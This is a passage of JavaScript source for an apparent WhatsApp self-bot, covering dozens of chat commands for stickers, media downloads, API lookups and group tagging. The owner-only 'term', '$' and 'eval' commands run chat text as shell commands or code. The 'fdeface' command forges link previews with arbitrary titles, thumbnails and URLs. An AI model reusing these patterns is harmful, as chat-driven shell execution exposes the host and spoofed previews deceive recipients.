		      buttons = [{buttonId: `waifu`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`owner`,buttonText:{displayText:'🦄OWNER'},type:1}]
              imageMsg = ( await xeon.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Dont forget to donate lol ☕', imageMessage: imageMsg,
              contentText:`Click Next to go to the next picture`,buttons,headerType:4}
              prep = await xeon.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              xeon.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
   case'songlyrics':
     reply(mess.wait)
  apa = await fetchJson(`https://bx-hunter.herokuapp.com/api/music/liriklagu?query=${args[0]}&apikey=${HunterApi}`,{method:'get'})
  apa2 = apa.result
  reply(apa2)
  break
case 'attp':
              if (args.length == 0) return reply(`Example: ${prefix + command} jack`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              xeon.sendMessage(from, buffer, sticker, { quoted: freply })
              break
				case 'recipes':
				if (args.length < 1) return reply('The title?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `❏ *${anu.results.title}*\n\n❏ Portion : ${anu.results.servings}\n❏ Time : ${anu.results.times}\n❏ Difficulty : ${anu.results.dificulty}\n❏ User : ${anu.results.author.user}\n❏ Publish Date : ${anu.results.author.datePublished}\n❏ Description : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Ingredients : ${anu.results.ingredient}\n❏ Step : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					xeon.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
					if (args.length < 1) return reply('Username?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
					gstalk = `❏ *GITHUB STALK*\n\n❏ Name : ${anu.result.name}\n❏ Followers : ${anu.result.followers}\n❏ Following : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Type : ${anu.result.type}\n❏ Company : ${anu.result.company}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Created At : ${anu.result.created_at}\n❏ Updated At : ${anu.result.updated_at}\n❏ Twitter Username : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.avatar_url)
					xeon.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 
					case 'infoearthquake':
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
					gempa = `❏ *INFO EARTHQUAKE*\n\n❏ Time : ${anu.result.Waktu}\n❏ Latitude : ${anu.result.Lintang}\n❏ Longitude : ${anu.result.Bujur}\n❏ Magnitude : ${anu.result.Magnitudo}\n❏ Depth : ${anu.result.Kedalaman}\n❏ Region : ${anu.result.Wilayah}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.Map)
					xeon.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break 
      case "contact":
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        xeon.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        break;
case 'antidelete':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Select on or off')
if (args[0] === "on") {
if(antidel)return reply('It has been activated before!')
antidel = true
reply(`Succesfully activated antidelete`)
} else if (args[0] === "off") {
if(!antidel)return reply('It has been deactivated before!')
antidel = false
reply(`Successfully turned off antidelete`)
} else {
reply(`Select on or off`)
}
break
      case 'welcome':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Select on or off')
if (args[0] === "on") {
if(welcom)return reply('It has been activated before!')
welcom = true
reply(`Succesfully activated welcome`)
} else if (args[0] === "off") {
if(!welcom)return reply('It has been deactivated before!')
welcom = false
reply(`Successfully turned off welcome`)
} else {
reply(`Select on or off`)
}
break          
      case "take":
      case "colong":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        if (!isQuotedSticker) return reply("Just a sticker");
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await xeon.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `SELF`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `BOT`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, xeon, mek, from);
        break;
      case "stikerwm":
      case "stickerwm":
      case "swm":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await xeon.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              xeon.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                xeon.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await xeon.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              xeon.sendMessage(from, "There is an error", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                xeon.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Send a picture with a caption ${prefix}swm text|text or image tags that have been sent`
          );
        }
        break;

      case "fdeface":
        ge = args.join("");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `send/reply image with caption ${prefix}fdeface link|title|desc|text`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
        const tipes = await xeon.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var anu = {
          detectLinks: false,
        };
        var mat = await xeon.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        xeon.sendMessage(from, mat, MessageType.extendedText, anu);
        break;
      case "public":
        if (!mek.key.fromMe) return reply("This feature is only for the owner 🗿");
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        fakeyt(`「 *PUBLIC-MODE* 」`);
        break;
      case "self":
        if (!mek.key.fromMe) return reply("This feature is only for the owner 🗿");
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        fakeyt(`「 *SELF-MODE* 」`);
        break;
      case "hidetag":
        if (!mek.key.fromMe) return reply("This feature is only for the owner 🗿");
        if (!isGroup) return reply('this feature is only for groups');
        var value = args.join(" ");
        var group = await xeon.groupMetadata(from);
        var member = group["participants"];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: mek,
        };
        xeon.sendMessage(from, optionshidetag, text);
        break;
    

case 'play2':   
				  if (args.length < 1) return reply('*Enter the title?*')
                reply('Loading.... ')
				play6 = args.join(" ")
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play6}&apikey=${zeksapi}`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*「 PLAY VIDEO 」*
				
Title : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Wait a moment..*`

				buffer1 = await getBuffer(anu.result.url_video)
				xeon.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:freply, caption: 'Here bro'})
					break  
					
      case "play":
        if (args.length === 0)
          return reply(
            `Send orders *${prefix}play* _The title of the song to be searched_`
          );
        var srch = args.join("");
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          yta(mulaikah).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 9999999)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the link_`
                  );
                const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait for the media file to be sent it may take a few minutes_`;
                sendMediaURL(from, thumb, captions);
                await sendMediaURL(from, dl_link).catch(() => reply("error"));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "video":
        if (args.length === 0)
          return reply(
            `Send orders *${prefix}video* _The title of the song to be search for_`
          );
        var srch = args.join("");
        aramas = await yts(srch);
        aramat = aramas.all;
        var mulaikah = aramat[0].url;
        try {
          ytv(mulaikah).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then(async (a) => {
                if (Number(filesize) >= 100000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the link_`
                  );
                const captions = `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Please wait for the media file to be sent it may take a few minutes_`;
                sendMediaURL(from, thumb, captions);
                await sendMediaURL(from, dl_link).catch(() => reply("error"));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "sticker":
      case "stiker":
      case "sg":
      case "s":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await xeon.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              xeon.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await xeon.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              xeon.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Send a picture with a caption ${prefix}sticker\nVideo Sticker Duration 1-9 Seconds`
          );
        }
        break;
      case "toimg":
        if (!isQuotedSticker) return reply("𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !");
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await xeon.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Well failed, try again ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, `Here bro ${pushname}`);
          fs.unlinkSync(ran);
        });
        break;
      case "ytsearch":
        if (args.length < 1) return reply("Please enter a query!");
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await xeon.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = "";
        ytresult += "「 *YOUTUBE SEARCH* 」";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "❏ Title: " + video.title + "\n";
          ytresult += "❏ Link: " + video.url + "\n";
          ytresult += "❏ Duration: " + video.timestamp + "\n";
          ytresult +=
            "❏ Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "◩ *SELF-BOT*";
        await fakethumb(tbuff, ytresult);
        break;
      case "setreply":
      
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Success Changing Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await xeon.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Success");
        } else {
          reply(`Send a picture with a caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await xeon.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Success");
        } else {
          reply(`Send a picture with a caption ${prefix}sethumb`);
        }
        break;
      case "ytmp4":
        if (args.length === 0)
          return reply(`Send orders *${prefix}ytmp4 [linkYt]*`);
        let isLinks2 = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks2) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          ytv(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 9999999)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_For the duration of more than the limit is presented in the link_`
                  );
                const captionsYtmp4 = `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Please wait for the media file to be sent it may take a few minutes_`;
                sendMediaURL(from, thumb, captionsYtmp4);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "emoji":
        if (!q) return fakegroup("the emoji?");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
      case "ytmp3":
        if (args.length === 0)
          return reply(`Send orders *${prefix}ytmp3 [linkYt]*`);
        let isLinks = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          yta(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 30000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*Data Successfully Obtained!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\nFor the duration of more than the limit is presented in the link`
                  );
                const captions = `╭──────────────────╮\n         *ʏᴛᴍᴘ3*\n╭──────────────────╯\n│ *ᴛɪᴛʟᴇ* : ${title}\n│ *ᴇxᴛ* : MP3\n╰──────────────────────────╮\n*sɪᴢᴇ* : ${filesizeF}\n╰───────────────────────────╯\n❑ Please wait for the media file to be sent it may take a few minutes\n\n ©ᴘᴇᴘᴇ`;
                sendMediaURL(from, thumb, captions);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "image":
      case "gimage":
      case "googleimage":
        if (args.length < 1) return reply("What do you want to search?");
        reply(mess.wait);
        teks = args.join(" ");
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              "_[ ! ] Error Found Error Or Result Not Found_"
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        break;

      case "igstalk":
        if (!q) return fakegroup("Username?");
        ig.fetchUser(`${args.join(" ")}`).then((Y) => {
          console.log(`${args.join(" ")}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Followers* : ${Y.followers}\n*Following* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        break;
      case "fb":
        if (!q) return reply("The link?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
        
      case "term":
      if (!mek.key.fromMe) return;
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return fakegroup(`Only for owner 🗿:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
      case "join":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return reply("Enter the group link");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return fakegroup("make sure the link is open!");
          var response = await xeon.acceptInvite(codeInvite);
          grupinv("SUCCESS");
        } catch {
          fakegroup("LINK ERROR!");
        }
        break;
      case "runtime":
      case "test":
        run = process.uptime();
        teks = `${kyun(run)}`;
        reply(teks);
        break;
      case "speed":
      case "ping":
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          reply(pingnya);
        });
        break;
    
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await xeon.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await xeon.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          xeon.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await xeon.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await xeon.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          xeon.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await xeon.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await xeon.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          xeon.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await xeon.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await xeon.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          xeon.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply image/sticker/audio/video with caption ${prefix}totag`
          );
        }
        break;
      case "tomp4":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await xeon.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, "Done");
          });
        } else {
          reply("reply sticker");
        }
        fs.unlinkSync(owgi);
        break;
      case "tourl":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          owgi = await xeon.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply("send/reply pictures/videos");
        }
        break;
      case "inspect":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("enter the link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("make sure its a link https://whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await xeon.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Gc Name* : ${subject}
*Gc created Date* : ${formatDate(creation * 1000)}
*Number of Members* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : there is not any"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc modified by* : -"
}\n*Date* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Saved contacts*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Yes" : "No"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          xeon.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          reply("Link error");
        }
        break;
      case "eval":
        if (!mek.key.fromMe) return;
        xeon.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
if (!mek.key.fromMe) return;
if (_chats.startsWith('$')){
if (!isOwner)return// reply(`This command can not be carried out by rent bot temporarily`)
if (!q)return 
var itsme = `${sender}`
var split = `*jack Bot Inc.*`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(q, (err, stdout) => {
if (err) return xeon.sendMessage(from, ` ${err}`, text, { quoted: mek })
if (stdout) {
xeon.sendMessage(from, stdout, text, term)
}
})
}

      default:
		if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[Message Bot]', 'cyan'), color('Horny = Bonks', 'yellow'), color('(💥)', 'white'))
          }
